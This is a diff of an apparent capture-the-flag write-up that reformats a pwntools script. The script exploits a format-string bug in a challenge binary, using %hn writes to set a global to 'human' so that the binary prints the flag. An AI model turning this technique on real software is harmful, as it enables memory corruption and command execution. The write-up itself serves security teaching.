@@ -68,47 +68,47 @@ The program uses `fgets(name, 0x60, stdin)`, which limits our payload to **96 by
 
 Python
 
-`from pwn import *
-
-# 1. Setup connection and target info
-io = remote('133.88.122.244', 32061)
-target = 0x404050 # Global address of 'type' from objdump
-
-# 2. Mathematical Offset Calculation
-# Buffer starts at Offset 8. We place addresses at Byte 48 of the buffer.
-# Offset = 8 + (48 / 8) = 14.
-off = 14
-
-# 3. Build the Format String (Writing "human\0")
-# Segment 1: Print 30056 chars to make the counter 0x7568 ("hu")
-p1 = f"%{30056}c%{off}$hn"
-
-# Segment 2: We need counter to be 0x616d. Since 0x616d < 0x7568, 
-# we wrap around: (0x1616d - 0x7568) = 60421.
-p2 = f"%{60421}c%{off+1}$hn"
-
-# Segment 3: We need counter to be 0x006e ("n\0").
-# Wrap around: (0x2006e - 0x1616d) = 40705.
-p3 = f"%{40705}c%{off+2}$hn"
-
-fmt = (p1 + p2 + p3).encode()
-
-# 4. Construct Aligned Payload
-# Pad the format string to exactly 48 bytes so p64 addresses start at Offset 14
-payload = fmt.ljust(48, b"A")
-
-# 5. Append addresses corresponding to our %hn writes
-payload += p64(target)     # Points to 0x404050 (writes "hu")
-payload += p64(target + 2) # Points to 0x404052 (writes "ma")
-payload += p64(target + 4) # Points to 0x404054 (writes "n\0")
-
-# 6. Execution
-io.sendlineafter(b"Name: ", payload) # Trigger the format string vulnerability
-io.sendlineafter(b"Phone: ", b"1")   # Satisfy the scanf("%d")
-
-# 7. Flag Retrieval
-# The printf will dump ~131KB of padding, then the flag
-data = io.recvall()
-print(data.decode(errors='ignore'))`
+    from pwn import *
+    
+    # 1. Setup connection and target info
+    io = remote('133.88.122.244', 32061)
+    target = 0x404050 # Global address of 'type' from objdump
+    
+    # 2. Mathematical Offset Calculation
+    # Buffer starts at Offset 8. We place addresses at Byte 48 of the buffer.
+    # Offset = 8 + (48 / 8) = 14.
+    off = 14
+    
+    # 3. Build the Format String (Writing "human\0")
+    # Segment 1: Print 30056 chars to make the counter 0x7568 ("hu")
+    p1 = f"%{30056}c%{off}$hn"
+    
+    # Segment 2: We need counter to be 0x616d. Since 0x616d < 0x7568, 
+    # we wrap around: (0x1616d - 0x7568) = 60421.
+    p2 = f"%{60421}c%{off+1}$hn"
+    
+    # Segment 3: We need counter to be 0x006e ("n\0").
+    # Wrap around: (0x2006e - 0x1616d) = 40705.
+    p3 = f"%{40705}c%{off+2}$hn"
+    
+    fmt = (p1 + p2 + p3).encode()
+    
+    # 4. Construct Aligned Payload
+    # Pad the format string to exactly 48 bytes so p64 addresses start at Offset 14
+    payload = fmt.ljust(48, b"A")
+    
+    # 5. Append addresses corresponding to our %hn writes
+    payload += p64(target)     # Points to 0x404050 (writes "hu")
+    payload += p64(target + 2) # Points to 0x404052 (writes "ma")
+    payload += p64(target + 4) # Points to 0x404054 (writes "n\0")
+    
+    # 6. Execution
+    io.sendlineafter(b"Name: ", payload) # Trigger the format string vulnerability
+    io.sendlineafter(b"Phone: ", b"1")   # Satisfy the scanf("%d")
+    
+    # 7. Flag Retrieval
+    # The printf will dump ~131KB of padding, then the flag
+    data = io.recvall()
+    print(data.decode(errors='ignore'))
 
 By precisely aligning the addresses to a multiple of 8 and calculating the `printf` wrap-around math, we forced the binary to believe we were "human," triggering the `system("cat flag.txt")` call.
